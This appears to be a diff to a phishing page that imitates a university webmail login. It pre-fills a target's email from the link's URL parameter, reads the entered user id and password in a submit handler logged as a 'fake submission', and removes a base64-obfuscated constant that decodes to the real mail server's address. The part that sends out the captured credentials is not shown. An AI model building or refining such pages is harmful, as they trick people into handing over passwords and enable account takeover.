@@ -314,7 +314,10 @@
         }
       }
     </style>
+
+    <script></script>
   </head>
+
   <body>
     <div>
       <!-- Add this for email pre-fill -->
@@ -470,22 +473,22 @@
 
     <!-- const url = atob(urlx); -->
     <script type="text/javascript">
+      // Run this code when the page loads
       document.addEventListener("DOMContentLoaded", function () {
-        // Safely get email element
-        const emailElement = document.getElementById("getme");
-        if (emailElement) {
-          const email = emailElement.getAttribute("eilId");
-          const userIdField = document.getElementById("user-input");
-          if (userIdField) userIdField.value = email || "";
-        }
+        // Parse URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+
+        // Get a specific parameter
+        const email = urlParams.get("email");
+
+        console.log(email);
+
+        // Example: Populate an input field with the email
+        const emailInput = document.getElementById("user-input");
+        if (emailInput) emailInput.value = email || "";
       });
 
-      const land = atob("aHR0cHM6Ly9tYWlsLm5pdHJrbC5hYy5pbi8=");
-
-      console.log("land: ", land);
-      let count = 0;
-
-      function submitLogin(event) {
+      const submitLogin = (event) => {
         event.preventDefault();
         // Get elements
         const userid = document.getElementById("user-input").value;
@@ -522,8 +525,8 @@
           document.getElementById("pass-input").focus();
 
           console.log("Fake submission complete");
-        }, 5000); // 5000ms = 5 seconds
-      }
+        }, 3000); // 5000ms = 5 seconds
+      };
     </script>
   </body>
 </html>
